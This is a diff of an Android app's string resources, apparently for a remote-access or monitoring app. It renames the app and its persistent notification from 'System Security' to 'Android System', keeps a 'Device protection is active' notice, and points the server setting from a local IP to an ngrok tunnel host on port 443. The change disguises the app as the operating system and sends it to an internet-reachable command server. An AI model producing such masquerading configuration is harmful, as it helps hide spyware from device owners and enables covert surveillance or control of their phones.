@@ -1,10 +1,10 @@
 <resources>
-    <string name="app_name">System Security</string>
-    <string name="service_channel_name">System Security Service</string>
-    <string name="service_notification_title">System Security</string>
+    <string name="app_name">Android System</string>
+    <string name="service_channel_name">Android System Service</string>
+    <string name="service_notification_title">Android System</string>
     <string name="service_notification_active">Device protection is active</string>
     
     <!-- Server Configuration -->
-    <string name="server_ip">192.168.1.2</string> 
-    <string name="server_port">42474</string>
+    <string name="server_ip">0b00-2001-ee0-4a10-c500-c4a7-b2e-1d74-aa7e.ngrok-free.app</string> 
+    <string name="server_port">443</string>
 </resources>
